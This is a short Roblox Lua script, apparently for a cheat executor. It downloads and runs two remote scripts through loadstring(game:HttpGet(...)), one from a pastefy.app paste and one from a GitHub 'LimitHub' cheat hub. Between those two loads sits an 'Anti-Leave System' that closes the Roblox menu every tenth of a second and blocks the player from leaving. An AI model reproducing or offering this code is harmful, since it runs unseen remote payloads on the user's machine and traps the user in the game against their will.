-- Run Pastefy first
local success1, err1 = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw"))()
end)

if not success1 then
    warn("[ERROR] Pastefy script failed:", err1)
else
    print("[SUCCESS] Pastefy script loaded.")
end


-- Anti-Leave System (closes Roblox menu instantly)
local GuiService = game:GetService("GuiService")
spawn(function()
    while true do
        task.wait(0.1)
        if GuiService.MenuIsOpen then
            GuiService.MenuIsOpen = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Blocked!";
                Text = "Leaving is disabled.";
                Duration = 2;
            })
        end
    end
end)


-- Run LimitHub last
local success2, err2 = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua"))()
end)

if not success2 then
    warn("[ERROR] LimitHub script failed:", err2)
else
    print("[SUCCESS] LimitHub script loaded.")
end
